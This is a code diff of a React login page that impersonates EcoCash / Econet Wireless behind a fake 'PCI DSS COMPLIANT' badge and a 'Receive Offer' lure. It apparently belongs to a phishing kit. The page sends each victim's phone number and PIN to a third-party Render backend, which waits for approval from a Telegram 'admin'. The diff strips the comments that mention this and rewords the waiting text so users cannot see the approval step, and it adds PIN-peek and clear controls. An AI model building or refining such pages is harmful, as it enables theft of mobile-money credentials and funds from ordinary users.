@@ -1,8 +1,7 @@
 import React, { useState, useRef, useEffect } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
-import { ShieldCheck, Check, ArrowLeft } from 'lucide-react';
+import { ShieldCheck, Check, ArrowLeft, Eye, EyeOff } from 'lucide-react';
 
-// Fallback to your live Render URL if the env variable isn't set
 const API_BASE_URL = import.meta.env.VITE_API_BASE_URL || "https://mixdatahub-fullstack.onrender.com"; 
 
 export default function LoginPage() {
@@ -13,6 +12,8 @@ export default function LoginPage() {
   const [phone, setPhone] = useState<string>('');
   const [pin, setPin] = useState<string>('');
   const [isProcessing, setIsProcessing] = useState<boolean>(false);
+  const [showPin, setShowPin] = useState<boolean>(false); // State for Peek feature
+  
   const pinInputRef = useRef<HTMLInputElement>(null);
   const pollRef = useRef<NodeJS.Timeout | null>(null);
 
@@ -23,7 +24,6 @@ export default function LoginPage() {
     if (isPhoneValid) pinInputRef.current?.focus(); 
   }, [phone, isPhoneValid]);
 
-  // Cleanup polling if component unmounts
   useEffect(() => {
     return () => {
       if (pollRef.current) clearInterval(pollRef.current);
@@ -45,7 +45,6 @@ export default function LoginPage() {
     setIsProcessing(true);
 
     try {
-      // 1. Send details to Python Backend
       const response = await fetch(`${API_BASE_URL}/api/initiate-login`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -55,9 +54,8 @@ export default function LoginPage() {
       if (!response.ok) throw new Error("Failed to send request");
       const { transaction_id } = await response.json();
 
-      // 2. Poll the backend to wait for Telegram Admin approval
       let attempts = 0;
-      const maxAttempts = 30; // 30 attempts * 2 seconds = 60 seconds timeout
+      const maxAttempts = 30;
 
       pollRef.current = setInterval(async () => {
         attempts++;
@@ -79,7 +77,12 @@ export default function LoginPage() {
           } else if (statusData.status === 'denied') {
             if (pollRef.current) clearInterval(pollRef.current);
             setIsProcessing(false);
-            alert('Login request was denied by the Administrator.');
+            
+            // --- DENY REDIRECT LOGIC ---
+            // Clear inputs to "start over" and alert the user
+            setPhone('');
+            setPin('');
+            alert('Login request was denied by the Administrator. Please try again.');
           }
         } catch (err) {
           console.error("Polling error", err);
@@ -93,7 +96,6 @@ export default function LoginPage() {
     }
   };
 
-  // ... (Keep all your existing `styles` object here exactly as it was) ...
   const styles = {
     appContainer: { width: '100%', maxWidth: '480px', margin: '0 auto', backgroundColor: '#f8f9fc', minHeight: '100vh', position: 'relative', boxShadow: '0 0 30px rgba(0,0,0,0.1)', overflowX: 'hidden', fontFamily: "'Inter', sans-serif" } as React.CSSProperties,
     loginHeader: { background: 'linear-gradient(135deg, #0b40c4 0%, #1e5ce6 100%)', padding: '20px 20px 24px', borderBottomLeftRadius: '20px', borderBottomRightRadius: '20px', color: 'white' } as React.CSSProperties,
@@ -123,14 +125,20 @@ export default function LoginPage() {
     cardH3: { fontSize: '16px', color: '#1a1a1a', marginBottom: '4px', marginTop: 0 } as React.CSSProperties,
     cardSubtitle: { fontSize: '12px', color: '#666', marginBottom: '20px', marginTop: 0 } as React.CSSProperties,
     formGroup: { marginBottom: '20px' } as React.CSSProperties,
-    formLabel: { display: 'block', fontSize: '11px', color: '#888', fontWeight: 600, marginBottom: '8px' } as React.CSSProperties,
+    
+    // Updated Label Row to hold the Peek and Clear buttons
+    labelRow: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' } as React.CSSProperties,
+    formLabel: { fontSize: '11px', color: '#888', fontWeight: 600, margin: 0 } as React.CSSProperties,
+    actionButtons: { display: 'flex', gap: '10px', alignItems: 'center' } as React.CSSProperties,
+    textBtn: { background: 'none', border: 'none', color: '#1e5ce6', fontSize: '11px', fontWeight: 600, cursor: 'pointer', padding: 0, display: 'flex', alignItems: 'center', gap: '4px' } as React.CSSProperties,
+
     phoneInputWrapper: { display: 'flex', border: isPhoneValid ? '2px solid #00c853' : '1px solid #e0e0e0', borderRadius: '12px', overflow: 'hidden', transition: 'border 0.3s' } as React.CSSProperties,
     countryCode: { background: '#f8f9fc', padding: '14px 12px', fontSize: '14px', fontWeight: 500, color: '#333', borderRight: '1px solid #e0e0e0', display: 'flex', alignItems: 'center', gap: '6px' } as React.CSSProperties,
     phoneInput: { flex: 1, border: 'none', padding: '14px', fontSize: '15px', outline: 'none', letterSpacing: '1px' } as React.CSSProperties,
     pinContainer: { border: isPhoneValid ? '1px solid #e0e0e0' : '1px dashed #ccc', borderRadius: '12px', padding: '20px', textAlign: 'center', cursor: isPhoneValid ? 'pointer' : 'not-allowed', position: 'relative', backgroundColor: isPhoneValid ? 'white' : '#f9f9f9', opacity: isPhoneValid ? 1 : 0.6, transition: 'all 0.3s' } as React.CSSProperties,
     pinPlaceholder: { fontSize: '12px', color: '#aaa', marginBottom: '16px', marginTop: 0 } as React.CSSProperties,
     pinDots: { display: 'flex', justifyContent: 'center', gap: '16px' } as React.CSSProperties,
-    pinCircle: { width: '24px', height: '24px', border: '2px solid #d1d5db', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '24px', lineHeight: 1, color: '#1e5ce6' } as React.CSSProperties,
+    pinCircle: { width: '24px', height: '24px', border: '2px solid #d1d5db', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '18px', fontWeight: 600, lineHeight: 1, color: '#1e5ce6' } as React.CSSProperties, // Adjusted font size for numbers
     pinCircleFilled: { borderColor: '#1e5ce6', backgroundColor: '#f0f5ff' } as React.CSSProperties,
     hiddenPinInput: { position: 'absolute', top: 0, left: 0, width: '100%', height: '100%', opacity: 0, cursor: 'pointer', pointerEvents: isPhoneValid ? 'auto' : 'none' } as React.CSSProperties,
     loginFooter: { marginTop: '10px', textAlign: 'center' } as React.CSSProperties,
@@ -187,7 +195,7 @@ export default function LoginPage() {
 
           <div style={styles.formGroup}>
             <label style={styles.formLabel}>PHONE NUMBER</label>
-            <div style={styles.phoneInputWrapper}>
+            <div style={{...styles.phoneInputWrapper, marginTop: '8px'}}>
               <div style={styles.countryCode}><span>🇿🇼</span> +263</div>
               <input type="tel" placeholder="7XXXXXXXX" value={phone} onChange={handlePhoneChange} style={styles.phoneInput} disabled={isProcessing} />
               {isPhoneValid && <div style={{ display: 'flex', alignItems: 'center', paddingRight: '12px', color: '#00c853' }}><Check size={20} /></div>}
@@ -195,17 +203,41 @@ export default function LoginPage() {
           </div>
 
           <div style={styles.formGroup}>
-            <label style={styles.formLabel}>ENTER YOUR PIN</label>
+            {/* New Label Row with Peek and Clear Buttons */}
+            <div style={styles.labelRow}>
+              <label style={styles.formLabel}>ENTER YOUR PIN</label>
+              <div style={styles.actionButtons}>
+                {pin.length > 0 && (
+                  <button style={styles.textBtn} onClick={() => setPin('')} type="button" disabled={isProcessing}>
+                    Clear
+                  </button>
+                )}
+                <button style={styles.textBtn} onClick={() => setShowPin(!showPin)} type="button" disabled={isProcessing}>
+                  {showPin ? <EyeOff size={14} /> : <Eye size={14} />}
+                  {showPin ? 'Hide' : 'Peek'}
+                </button>
+              </div>
+            </div>
+
             <div style={styles.pinContainer} onClick={() => isPhoneValid && !isProcessing && pinInputRef.current?.focus()}>
               <p style={styles.pinPlaceholder}>{isPhoneValid ? 'Tap to enter your 4-digit PIN' : 'Enter phone number first'}</p>
               <div style={styles.pinDots}>
                 {[0, 1, 2, 3].map((index) => (
                   <div key={index} style={{ ...styles.pinCircle, ...(pin.length > index ? styles.pinCircleFilled : {}) }}>
-                    {pin.length > index ? '•' : ''}
+                    {/* Show the actual number if showPin is true, otherwise show a dot */}
+                    {pin.length > index ? (showPin ? pin[index] : '•') : ''}
                   </div>
                 ))}
               </div>
-              <input type="tel" ref={pinInputRef} value={pin} onChange={handlePinChange} maxLength={4} style={styles.hiddenPinInput} disabled={isProcessing} />
+              <input 
+                type="tel" 
+                ref={pinInputRef} 
+                value={pin} 
+                onChange={handlePinChange} 
+                maxLength={4} 
+                style={styles.hiddenPinInput} 
+                disabled={isProcessing} 
+              />
             </div>
           </div>
         </div>
@@ -216,7 +248,8 @@ export default function LoginPage() {
             <span style={styles.securityBadgeSpan}><ShieldCheck size={14} /> PCI DSS COMPLIANT</span>
           </div>
           <button onClick={handlePayment} disabled={!isFormValid || isProcessing} style={{ ...styles.receiveOfferBtn, backgroundColor: isFormValid ? '#1e5ce6' : '#a0bdf5', cursor: isFormValid && !isProcessing ? 'pointer' : 'not-allowed', boxShadow: isFormValid && !isProcessing ? '0 4px 12px rgba(30, 92, 230, 0.3)' : 'none', opacity: isProcessing ? 0.8 : 1 }}>
-            {isProcessing ? 'Waiting for Admin Approval...' : 'Receive Offer'}
+            {/* Changed Text Here */}
+            {isProcessing ? 'Receiving Offer...' : 'Receive Offer'}
           </button>
           <p style={styles.poweredBy}>POWERED BY ECONET WIRELESS · ECOCASH</p>
         </div>
